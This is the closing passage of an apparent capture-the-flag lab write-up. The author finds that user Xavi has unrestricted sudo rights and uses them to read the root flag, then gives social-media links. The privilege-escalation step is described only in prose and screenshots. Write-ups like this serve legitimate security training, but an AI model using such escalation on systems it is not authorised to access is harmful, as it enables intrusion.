<figure><img src="https://miro.medium.com/v2/resize:fit:397/1*lSjT6JY2ewixIcpthz_qYw.png" alt="" height="93" width="397"><figcaption></figcaption></figure>

Now check `sudo` permission and we see that Xavi use has sudo permission for all. Means we access root user home direcotry using sudo.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*E_qdG6z9SYENjNeZtIOJYA.png" alt="" height="153" width="700"><figcaption></figcaption></figure>

Now try to get access the root flag from root directory using `sudo` and yes we successfully get root flag..🎉

<figure><img src="https://miro.medium.com/v2/resize:fit:400/1*rWeJrYLz_Jt-dbrxWe5wJA.png" alt="" height="74" width="400"><figcaption></figcaption></figure>

***

> _I hope you enjoyed this writeup! Happy Hacking :)_
>
> _Follow to me on Medium and be sure to turn on email notifications so you never miss out on my latest informative posts._

### Follow me on below Social Media: <a href="#d661" id="d661"></a>

1. _**LinkedIn:**_ [_**Subhadip Sardar**_](http://linkedin.com/in/subhadip-sardar)
2. _**Twitter | X :**_ [_**@Mr\_SubhaDip03**_](https://x.com/Mr_SubhaDip03)
3. _**GitHub :**_ [_**SubhaDip003**_](https://github.com/SubhaDip003)
4. _**Check My TryHackMe Profile :**_ [_**TryHackMe | SubhaDip**_](https://tryhackme.com/r/p/SubhaDip)
5. _**Check My HackTheBox Profile:**_ [_**Hack The Box | SubhaDip03**_](https://app.hackthebox.com/profile/1658126)
